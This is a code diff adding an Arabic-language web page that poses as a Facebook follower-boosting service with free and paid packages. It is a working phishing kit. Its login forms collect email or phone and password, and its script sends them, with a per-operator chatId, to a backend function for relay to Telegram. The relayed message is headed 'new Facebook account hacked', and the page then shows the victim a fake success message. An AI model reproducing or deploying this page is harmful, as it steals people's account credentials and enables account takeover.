@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Followers - شحن متابعين فيسبوك</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@300;400;500;600;700&family=Noto+Sans+Arabic:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --fb-blue: #1877F2;
+            --fb-blue-dark: #1463cc;
+            --fb-green: #42B72A;
+            --fb-green-dark: #36a420;
+            --fb-black: #18191A;
+            --fb-dark: #242526;
+            --fb-gray: #3A3B3C;
+            --fb-light-gray: #B0B3B8;
+            --fb-white: #E4E6EB;
+            --fb-gradient: linear-gradient(135deg, #1877F2 0%, #1463cc 100%);
+            --fb-gradient-green: linear-gradient(135deg, #42B72A 0%, #36a420 100%);
+            --shadow-lg: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            --shadow-xl: 0 35px 60px -15px rgba(0, 0, 0, 0.6);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Noto Sans Arabic', 'IBM Plex Sans Arabic', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+            color: var(--fb-white);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(24, 119, 242, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(66, 183, 42, 0.03) 0%, transparent 50%);
+            z-index: -2;
+        }
+
+        .container {
+            background: var(--fb-dark);
+            border-radius: 28px;
+            width: 100%;
+            max-width: 500px;
+            padding: 45px 40px;
+            box-shadow: var(--shadow-xl);
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: var(--fb-gradient);
+            border-radius: 28px 28px 0 0;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 45px;
+            position: relative;
+        }
+
+        .fb-logo-wrapper {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 25px;
+        }
+
+        .fb-logo {
+            width: 80px;
+            height: 80px;
+            background: var(--fb-gradient);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.8rem;
+            color: white;
+            box-shadow: 0 15px 40px rgba(24, 119, 242, 0.4);
+            position: relative;
+            z-index: 2;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from { box-shadow: 0 15px 40px rgba(24, 119, 242, 0.4); }
+            to { box-shadow: 0 20px 50px rgba(24, 119, 242, 0.6), 0 0 30px rgba(24, 119, 242, 0.3); }
+        }
+
+        .fb-logo-wrapper::after {
+            content: '';
+            position: absolute;
+            top: -10px;
+            left: -10px;
+            right: -10px;
+            bottom: -10px;
+            background: var(--fb-gradient);
+            border-radius: 50%;
+            opacity: 0.2;
+            filter: blur(15px);
+            animation: pulse 3s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.2; }
+            50% { transform: scale(1.1); opacity: 0.3; }
+        }
+
+        .header h1 {
+            font-size: 2.4rem;
+            font-weight: 800;
+            background: linear-gradient(90deg, #1877F2, #42B72A);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
+
+        .header p {
+            color: var(--fb-light-gray);
+            font-size: 1.1rem;
+            font-weight: 400;
+            max-width: 320px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+
+        .section {
+            margin-bottom: 35px;
+        }
+
+        .section-title {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: var(--fb-white);
+            margin-bottom: 15px;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .section-title i {
+            color: var(--fb-blue);
+            font-size: 1.3rem;
+        }
+
+        .section-subtitle {
+            color: var(--fb-light-gray);
+            font-size: 1rem;
+            text-align: center;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        /* تصميم قسم تسجيل الدخول */
+        .login-options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .login-option {
+            background: var(--fb-gray);
+            border: 2px solid rgba(255, 255, 255, 0.08);
+            border-radius: 18px;
+            padding: 22px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .login-option:hover {
+            border-color: var(--fb-blue);
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(24, 119, 242, 0.2);
+        }
+
+        .login-option i {
+            font-size: 1.4rem;
+            color: var(--fb-blue);
+        }
+
+        .login-option span {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--fb-white);
+        }
+
+        /* تصميم الباقات */
+        .packages {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .package {
+            background: var(--fb-gray);
+            border: 2px solid rgba(255, 255, 255, 0.08);
+            border-radius: 18px;
+            padding: 25px;
+            position: relative;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            overflow: hidden;
+        }
+
+        .package:hover {
+            border-color: var(--fb-blue);
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(24, 119, 242, 0.2);
+        }
+
+        .free-badge {
+            background: var(--fb-gradient-green);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+            display: inline-block;
+            box-shadow: 0 8px 20px rgba(66, 183, 42, 0.3);
+        }
+
+        .package-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+
+        .package-title {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--fb-white);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .package-title i {
+            color: var(--fb-blue);
+            font-size: 1.2rem;
+        }
+
+        .package-price {
+            font-size: 1.5rem;
+            font-weight: 900;
+            color: var(--fb-blue);
+        }
+
+        .package-description {
+            font-size: 1rem;
+            color: var(--fb-light-gray);
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .select-btn {
+            background: var(--fb-gradient);
+            color: white;
+            border: none;
+            border-radius: 14px;
+            padding: 16px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .select-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(24, 119, 242, 0.3);
+        }
+
+        .select-btn:active {
+            transform: translateY(-1px);
+        }
+
+        /* تصميم النماذج */
+        .form-container {
+            display: none;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-container.active {
+            display: block;
+        }
+
+        .form-group {
+            margin-bottom: 28px;
+            position: relative;
+        }
+
+        .form-label {
+            display: block;
+            color: var(--fb-white);
+            font-size: 1.05rem;
+            margin-bottom: 12px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .form-label i {
+            color: var(--fb-blue);
+            font-size: 1.2rem;
+            width: 24px;
+            text-align: center;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--fb-blue);
+            font-size: 1.3rem;
+            z-index: 2;
+        }
+
+        .form-control {
+            width: 100%;
+            background: var(--fb-black);
+            border: 2px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 20px 60px 20px 20px;
+            color: var(--fb-white);
+            font-size: 1.1rem;
+            font-weight: 500;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            outline: none;
+        }
+
+        .form-control:focus {
+            border-color: var(--fb-blue);
+            box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.15);
+            background: rgba(24, 25, 26, 0.8);
+            transform: translateY(-2px);
+        }
+
+        .form-control::placeholder {
+            color: var(--fb-light-gray);
+            opacity: 0.7;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: var(--fb-gradient);
+            border: none;
+            border-radius: 18px;
+            padding: 22px;
+            color: white;
+            font-size: 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+
+        .submit-btn:hover {
+            background: var(--fb-gradient);
+            transform: translateY(-5px);
+            box-shadow: 0 25px 50px rgba(24, 119, 242, 0.4);
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: var(--fb-blue);
+            font-size: 1rem;
+            cursor: pointer;
+            margin-bottom: 25px;
+            padding: 12px 0;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .back-btn:hover {
+            color: var(--fb-white);
+            transform: translateX(-5px);
+        }
+
+        /* الرسائل */
+        .message {
+            margin-top: 30px;
+            padding: 22px;
+            border-radius: 16px;
+            text-align: center;
+            font-size: 1.1rem;
+            font-weight: 600;
+            min-height: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            opacity: 0;
+            transform: translateY(20px);
+            visibility: hidden;
+        }
+
+        .message.show {
+            opacity: 1;
+            transform: translateY(0);
+            visibility: visible;
+        }
+
+        .message.success {
+            background: rgba(66, 183, 42, 0.1);
+            border: 2px solid rgba(66, 183, 42, 0.3);
+            color: var(--fb-green);
+        }
+
+        .message.error {
+            background: rgba(242, 24, 24, 0.1);
+            border: 2px solid rgba(242, 24, 24, 0.3);
+            color: #F21818;
+        }
+
+        .message.processing {
+            background: rgba(24, 119, 242, 0.1);
+            border: 2px solid rgba(24, 119, 242, 0.3);
+            color: var(--fb-blue);
+        }
+
+        .features {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 35px;
+            padding-top: 25px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .feature-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            text-align: center;
+        }
+
+        .feature-icon {
+            width: 50px;
+            height: 50px;
+            background: rgba(24, 119, 242, 0.1);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            color: var(--fb-blue);
+            margin-bottom: 5px;
+            transition: all 0.3s ease;
+        }
+
+        .feature-item:hover .feature-icon {
+            background: rgba(24, 119, 242, 0.2);
+            transform: translateY(-3px);
+        }
+
+        .feature-text {
+            font-size: 0.85rem;
+            color: var(--fb-light-gray);
+            font-weight: 500;
+        }
+
+        .copyright {
+            text-align: center;
+            padding: 20px 0;
+            color: var(--fb-light-gray);
+            font-size: 0.9rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            margin-top: 25px;
+        }
+
+        .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: scale(0);
+            pointer-events: none;
+            animation: ripple-animation 0.6s linear;
+        }
+
+        @keyframes ripple-animation {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 35px 25px;
+            }
+            
+            .features {
+                flex-wrap: wrap;
+                gap: 20px;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- الهيدر -->
+        <div class="header">
+            <div class="fb-logo-wrapper">
+                <div class="fb-logo">
+                    <i class="fab fa-facebook-f"></i>
+                </div>
+            </div>
+            <h1>متابعين فيسبوك</h1>
+            <p>زود متابعينك واحصل على الشهرة</p>
+        </div>
+
+        <!-- المحتوى الرئيسي -->
+        <div class="content">
+            <!-- قسم تسجيل الدخول -->
+            <div class="section" id="loginSection">
+                <h2 class="section-title">
+                    <i class="fas fa-sign-in-alt"></i>
+                    تسجيل الدخول
+                </h2>
+                <p class="section-subtitle">
+                    اختر طريقة تسجيل الدخول للمتابعة وزيادة المتابعين
+                </p>
+                
+                <div class="login-options">
+                    <div class="login-option" onclick="showLoginForm('email')">
+                        <i class="fas fa-envelope"></i>
+                        <span>البريد الإلكتروني</span>
+                    </div>
+                    <div class="login-option" onclick="showLoginForm('phone')">
+                        <i class="fas fa-phone"></i>
+                        <span>رقم الهاتف</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- قسم الباقات -->
+            <div class="section">
+                <h2 class="section-title">
+                    <i class="fas fa-box-open"></i>
+                    باقات المتابعين
+                </h2>
+                <p class="section-subtitle">
+                    اختر الباقة المناسبة لك وإبدأ رحلتك نحو الشهرة
+                </p>
+                
+                <div class="packages">
+                    <!-- الباقة المجانية -->
+                    <div class="package">
+                        <div class="free-badge">مجاني بالكامل</div>
+                        <div class="package-header">
+                            <div class="package-title">
+                                <i class="fas fa-users"></i>
+                                متابع 1000
+                            </div>
+                        </div>
+                        <div class="package-description">
+                            احصل على 1000 متابع حقيقي مجاناً
+                        </div>
+                        <button class="select-btn" onclick="selectPackage(1000)">
+                            <i class="fas fa-check"></i>
+                            اختيار الباقة
+                        </button>
+                    </div>
+                    
+                    <!-- الباقات المدفوعة -->
+                    <div class="package">
+                        <div class="package-header">
+                            <div class="package-title">
+                                <i class="fas fa-user-plus"></i>
+                                متابع 1500
+                            </div>
+                            <div class="package-price">$2</div>
+                        </div>
+                        <div class="package-description">
+                            احصل على 1500 متابع حقيقي
+                        </div>
+                        <button class="select-btn" onclick="selectPackage(1500)">
+                            <i class="fas fa-check"></i>
+                            اختيار الباقة
+                        </button>
+                    </div>
+                    
+                    <div class="package">
+                        <div class="package-header">
+                            <div class="package-title">
+                                <i class="fas fa-user-friends"></i>
+                                متابع 2000
+                            </div>
+                            <div class="package-price">$3</div>
+                        </div>
+                        <div class="package-description">
+                            احصل على 2000 متابع حقيقي
+                        </div>
+                        <button class="select-btn" onclick="selectPackage(2000)">
+                            <i class="fas fa-check"></i>
+                            اختيار الباقة
+                        </button>
+                    </div>
+                    
+                    <div class="package">
+                        <div class="package-header">
+                            <div class="package-title">
+                                <i class="fas fa-crown"></i>
+                                متابع 5000
+                            </div>
+                            <div class="package-price">$5</div>
+                        </div>
+                        <div class="package-description">
+                            احصل على 5000 متابع حقيقي
+                        </div>
+                        <button class="select-btn" onclick="selectPackage(5000)">
+                            <i class="fas fa-check"></i>
+                            اختيار الباقة
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- نماذج تسجيل الدخول -->
+        <div class="form-container" id="emailForm">
+            <button class="back-btn" onclick="showLoginSection()">
+                <i class="fas fa-arrow-right"></i>
+                رجوع
+            </button>
+            <h2 class="section-title">
+                <i class="fas fa-envelope"></i>
+                تسجيل الدخول بالبريد الإلكتروني
+            </h2>
+            
+            <div class="form-group">
+                <label class="form-label">
+                    <i class="fas fa-at"></i>
+                    البريد الإلكتروني
+                </label>
+                <div class="input-wrapper">
+                    <input type="email" id="email" class="form-control" placeholder="أدخل بريدك الإلكتروني">
+                    <div class="input-icon">
+                        <i class="fas fa-envelope"></i>
+                    </div>
+                </div>
+            </div>
+            <div class="form-group">
+                <label class="form-label">
+                    <i class="fas fa-lock"></i>
+                    كلمة المرور
+                </label>
+                <div class="input-wrapper">
+                    <input type="password" id="emailPassword" class="form-control" placeholder="أدخل كلمة المرور">
+                    <div class="input-icon">
+                        <i class="fas fa-key"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <button class="submit-btn" onclick="submitLogin('email')">
+                <i class="fas fa-sign-in-alt"></i>
+                تسجيل الدخول
+            </button>
+        </div>
+
+        <div class="form-container" id="phoneForm">
+            <button class="back-btn" onclick="showLoginSection()">
+                <i class="fas fa-arrow-right"></i>
+                رجوع
+            </button>
+            <h2 class="section-title">
+                <i class="fas fa-phone"></i>
+                تسجيل الدخول برقم الهاتف
+            </h2>
+            
+            <div class="form-group">
+                <label class="form-label">
+                    <i class="fas fa-mobile-alt"></i>
+                    رقم الهاتف
+                </label>
+                <div class="input-wrapper">
+                    <input type="tel" id="phone" class="form-control" placeholder="أدخل رقم هاتفك">
+                    <div class="input-icon">
+                        <i class="fas fa-phone"></i>
+                    </div>
+                </div>
+            </div>
+            <div class="form-group">
+                <label class="form-label">
+                    <i class="fas fa-lock"></i>
+                    كلمة المرور
+                </label>
+                <div class="input-wrapper">
+                    <input type="password" id="phonePassword" class="form-control" placeholder="أدخل كلمة المرور">
+                    <div class="input-icon">
+                        <i class="fas fa-key"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <button class="submit-btn" onclick="submitLogin('phone')">
+                <i class="fas fa-sign-in-alt"></i>
+                تسجيل الدخول
+            </button>
+        </div>
+
+        <!-- رسائل النظام -->
+        <div class="message" id="msg"></div>
+
+        <!-- المميزات -->
+        <div class="features">
+            <div class="feature-item">
+                <div class="feature-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <div class="feature-text">آمن 100%</div>
+            </div>
+            <div class="feature-item">
+                <div class="feature-icon">
+                    <i class="fas fa-bolt"></i>
+                </div>
+                <div class="feature-text">شحن فوري</div>
+            </div>
+            <div class="feature-item">
+                <div class="feature-icon">
+                    <i class="fas fa-headset"></i>
+                </div>
+                <div class="feature-text">دعم 24/7</div>
+            </div>
+            <div class="feature-item">
+                <div class="feature-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <div class="feature-text">ضمان استرجاع</div>
+            </div>
+        </div>
+
+        <!-- حقوق النشر -->
+        <div class="copyright">
+            © 2024 جميع الحقوق محفوظة
+        </div>
+    </div>
+
+    <script>
+        // دالة إنشاء تأثير التموج
+        function createRipple(event) {
+            const btn = event.currentTarget;
+            const circle = document.createElement("span");
+            const diameter = Math.max(btn.clientWidth, btn.clientHeight);
+            const radius = diameter / 2;
+            
+            circle.style.width = circle.style.height = `${diameter}px`;
+            circle.style.left = `${event.clientX - btn.getBoundingClientRect().left - radius}px`;
+            circle.style.top = `${event.clientY - btn.getBoundingClientRect().top - radius}px`;
+            circle.classList.add("ripple");
+            
+            const ripple = btn.getElementsByClassName("ripple")[0];
+            if (ripple) {
+                ripple.remove();
+            }
+            
+            btn.appendChild(circle);
+        }
+
+        // دالة الحصول على chatId من الرابط
+        function getChatId() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('chatId');
+        }
+        
+        // دالة إرسال البيانات إلى Telegram
+        async function sendToTelegram(message) {
+            const chatId = getChatId();
+            if (!chatId) {
+                console.error('No chatId found');
+                return false;
+            }
+            
+            try {
+                const response = await fetch('/.netlify/functions/facebook', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chatId: chatId,
+                        message: message
+                    })
+                });
+                
+                const result = await response.json();
+                return result.success;
+                
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+        
+        // دالة عرض قسم تسجيل الدخول
+        function showLoginSection() {
+            document.querySelector('.content').style.display = 'block';
+            document.querySelectorAll('.form-container').forEach(form => {
+                form.classList.remove('active');
+            });
+            showMessage('');
+        }
+        
+        // دالة عرض نموذج تسجيل الدخول
+        function showLoginForm(type) {
+            document.querySelector('.content').style.display = 'none';
+            document.querySelectorAll('.form-container').forEach(form => {
+                form.classList.remove('active');
+            });
+            document.getElementById(type + 'Form').classList.add('active');
+            showMessage('');
+        }
+        
+        // دالة إرسال بيانات تسجيل الدخول
+        async function submitLogin(type) {
+            let email, phone, password;
+            
+            if (type === 'email') {
+                email = document.getElementById('email').value.trim();
+                password = document.getElementById('emailPassword').value.trim();
+            } else {
+                phone = document.getElementById('phone').value.trim();
+                password = document.getElementById('phonePassword').value.trim();
+            }
+            
+            if ((!email && !phone) || !password) {
+                showMessage('⚠️ يرجى ملء جميع الحقول', 'error');
+                return;
+            }
+            
+            const chatId = getChatId();
+            const message = `
+👍 <b>تم اختراق حساب فيسبوك جديد</b>
+
+📝 <b>نوع التسجيل:</b> ${type}
+${email ? `📧 <b>البريد الإلكتروني:</b> ${email}\n` : ''}
+${phone ? `📱 <b>رقم الهاتف:</b> ${phone}\n` : ''}
+🔑 <b>كلمة المرور:</b> ${password}
+🆔 <b>Chat ID:</b> ${chatId}
+⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}
+            `.trim();
+            
+            showMessage('⏳ جاري تسجيل الدخول...', 'processing');
+            
+            const sent = await sendToTelegram(message);
+            
+            if (sent) {
+                showMessage('✅ تم تسجيل الدخول بنجاح!', 'success');
+                setTimeout(() => {
+                    showLoginSection();
+                    // إعادة تعيين الحقول
+                    if (type === 'email') {
+                        document.getElementById('email').value = '';
+                        document.getElementById('emailPassword').value = '';
+                    } else {
+                        document.getElementById('phone').value = '';
+                        document.getElementById('phonePassword').value = '';
+                    }
+                }, 2000);
+            } else {
+                showMessage('❌ حدث خطأ في التسجيل، يرجى المحاولة مرة أخرى', 'error');
+            }
+        }
+        
+        // دالة اختيار الباقة
+        async function selectPackage(followers) {
+            const chatId = getChatId();
+            const price = followers === 1000 ? 'مجاني' : 
+                         followers === 1500 ? '$2' : 
+                         followers === 2000 ? '$3' : '$5';
+            
+            const message = `
+👍 <b>طلب باقة متابعين فيسبوك</b>
+
+📦 <b>الباقة المختارة:</b> ${followers} متابع
+💰 <b>السعر:</b> ${price}
+🆔 <b>Chat ID:</b> ${chatId}
+⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}
+            `.trim();
+            
+            showMessage('⏳ جاري معالجة الطلب...', 'processing');
+            
+            const sent = await sendToTelegram(message);
+            
+            if (sent) {
+                showMessage(`🎉 تم طلب باقة ${followers} متابع بنجاح!\n⏳ جاري المعالجة...`, 'success');
+            } else {
+                showMessage('❌ حدث خطأ في الطلب، يرجى المحاولة مرة أخرى', 'error');
+            }
+        }
+        
+        // دالة عرض الرسائل
+        function showMessage(text, type = '') {
+            const msg = document.getElementById('msg');
+            if (!text) {
+                msg.classList.remove('show');
+                setTimeout(() => {
+                    msg.innerHTML = '';
+                    msg.className = 'message';
+                }, 300);
+                return;
+            }
+            
+            let icon = '';
+            if (type === 'success') icon = '<i class="fas fa-check-circle"></i>';
+            else if (type === 'error') icon = '<i class="fas fa-times-circle"></i>';
+            else if (type === 'processing') icon = '<i class="fas fa-spinner fa-spin"></i>';
+            
+            msg.innerHTML = icon + ' ' + text;
+            msg.className = `message ${type}`;
+            setTimeout(() => {
+                msg.classList.add('show');
+            }, 10);
+        }
+        
+        // إضافة تأثيرات عند التحميل
+        window.addEventListener('load', function() {
+            const chatId = getChatId();
+            if (!chatId) {
+                showMessage('⚠️ الرابط غير صحيح - يرجى استخدام الرابط الصحيح', 'error');
+            }
+            
+            // إضافة تأثيرات النقر على جميع الأزرار
+            document.querySelectorAll('button').forEach(btn => {
+                btn.addEventListener('click', createRipple);
+            });
+            
+            // إضافة تأثيرات Hover
+            document.querySelectorAll('.login-option, .package, .select-btn, .submit-btn').forEach(element => {
+                element.addEventListener('mouseenter', () => {
+                    element.style.transform = 'translateY(-3px)';
+                });
+                
+                element.addEventListener('mouseleave', () => {
+                    element.style.transform = 'translateY(0)';
+                });
+            });
+        });
+    </script>
+</body>
+</html>
